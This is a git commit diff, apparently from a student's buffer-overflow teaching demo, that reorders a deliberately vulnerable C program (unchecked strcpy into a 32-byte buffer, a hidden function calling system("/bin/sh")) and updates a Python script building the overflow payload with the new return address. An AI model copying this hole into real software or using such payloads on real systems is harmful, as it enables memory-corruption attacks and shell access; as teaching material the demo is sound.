7ee2c3bc9d65da0f153e9aa56fc6f185d845669f
Sam Crawford <sam.crawford@stud.plus.ac.at>
2026-01-30 14:54:21 +0100

    reorder functions to reduce loc

--- buffer-overflow-demo/_.py
+++ buffer-overflow-demo/_.py
@@ -1,6 +1,6 @@
-# 0804848f address of secret function
 import sys
 
-address = b"\x08\x04\x84\x8f"[::-1]
+# 0804843e
+address = b"\x08\x04\x84\x3e"[::-1]
 payload = b"A" * 32 + b"BBBBCCCCDDDD" + address
 sys.stdout.buffer.write(payload)
--- buffer-overflow-demo/lower.c
+++ buffer-overflow-demo/lower.c
@@ -3,33 +3,28 @@
 #include <stdlib.h>
 #include <string.h>
 
-void str_to_lowercase(char *str);
-void vulnerable_code(char *input_str);
-
-int main(int argc, char *argv[]) {
-  if (argc != 2) {
-    perror("usage: <program> <input>\n");
-    return 1;
-  }
-
-  vulnerable_code(argv[1]);
+void str_to_lowercase(char *str) {
+    int length = strlen(str);
+    for (int i = 0; i < length; ++i)
+        str[i] = tolower(str[i]);
 }
 
 void vulnerable_code(char *input_str) {
-  char small_buffer[32];
-  strcpy(small_buffer, input_str);
-  str_to_lowercase(input_str);
-  printf("The string '%s' in lowercase is: '%s'\n", small_buffer, input_str);
-}
-
-void str_to_lowercase(char *str) {
-  int length = strlen(str);
-  for (int i = 0; i < length; ++i) {
-    str[i] = tolower(str[i]);
-  }
+    char small_buffer[32];
+    strcpy(small_buffer, input_str);
+    str_to_lowercase(input_str);
+    printf("The string '%s' in lowercase is: '%s'\n", small_buffer, input_str);
 }
 
 void secret_function() {
-  printf("\n!!!You have reached the secret code!!!\n");
-  system("/bin/sh");
+    printf("\n!!!You have reached the secret code!!!\n");
+    system("/bin/sh");
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        perror("usage: <program> <input>\n");
+        return 1;
+    }
+    vulnerable_code(argv[1]);
 }
